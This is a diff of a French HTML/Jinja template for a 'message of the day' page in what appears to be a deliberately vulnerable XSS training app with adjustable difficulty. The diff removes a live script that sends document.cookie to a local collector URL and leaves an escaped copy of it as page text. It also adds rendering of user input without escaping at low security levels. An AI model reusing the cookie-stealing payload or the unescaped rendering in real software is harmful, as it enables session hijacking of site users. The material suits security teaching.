@@ -12,9 +12,33 @@
         {% endif %}
 
         {% if user %}
-            <h3><strong>Message du jour 28: </strong>{{ message_du_jour }}</h3>
-            <h3><strong>Message du jour 28: </strong> Si vous lisez ces lignes, courage à vous.<script>window.onload = function(e) {fetch('http://127.0.0.1:5001/cookie/' + document.cookie);}</script></h3>
-            <h5><i>Proposé par XxUnknowUserxX</i></h5>
+            <div class="btn-container">
+                <a href="/prec_day"><button onclick="fetch('')">⟵ Jour précédent</button></a>
+                <a href="/next_day"><button onclick="fetch('/next_day')">Jour suivant ⟶</button></a>
+            </div>
+
+            <style>
+            .btn-container {
+                display: flex;
+                justify-content: flex-end; /* colle les boutons à droite */
+                gap: 10px;                 /* espace entre les deux boutons */
+            }
+
+            button {
+                padding: 8px 14px;
+                cursor: pointer;
+            }
+            </style>
+            {% if editeur_message_du_jour %}
+                <h3><strong>Message du jour {{ jour }}: </strong>{% if security_level == 1 or security_level == 2 %}{{ contenue_message_du_jour|safe }}{% else %}{{ contenue_message_du_jour }}{% endif %}</h3>
+                <h5><i>Proposé par {{ editeur_message_du_jour }}</i></h5>
+            {% else %}
+                <h3><strong>Message du jour {{ jour }}: </strong>{{ contenue_message_du_jour }}</h3>
+                <form action="/message_du_jour" method="POST">
+                    <input type="text" name="message_du_jour" placeholder="Entrez votre message ..." required>
+                    <button type="submit">Envoyer</button>
+                </form>
+            {% endif %}
         {% endif %}
 
         {% if user %}
@@ -42,5 +66,7 @@
 
              <a href="/difficulty"><h2>Changer la diffilculté</h2></a>
 {% if user %}<a href="/logout"><h2>Se déconnecter</h2>            </a>{% endif %}
+
+    Si vous lisez ces lignes, courage à vous.&lt;script&gt;window.onload = function(e) {fetch(&#39;http://127.0.0.1:5001/cookie/&#39; + document.cookie);}&lt;/script&gt;
     </body>
 </html>
